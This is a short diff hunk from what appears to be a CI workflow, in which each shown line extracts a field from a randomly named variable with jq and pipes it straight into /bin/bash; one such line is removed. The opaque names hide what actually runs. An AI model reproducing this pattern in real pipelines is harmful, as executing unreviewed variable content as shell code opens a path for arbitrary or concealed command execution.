@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$fysk4" | jq -r .qhweh682 | /bin/bash
           printf '%s' "$axw75" | jq -r .hggar3643 | /bin/bash
           printf '%s' "$f338" | jq -r .if48154 | /bin/bash
-          printf '%s' "$i1420" | jq -r .ty7 | /bin/bash
           echo $v7143 | jq -r .uxsn6 | /bin/bash
           echo $yrve602 | jq -r .djkm45402 | /bin/bash
           printf '%s' "$mbj641" | jq -r .vney68 | /bin/bash
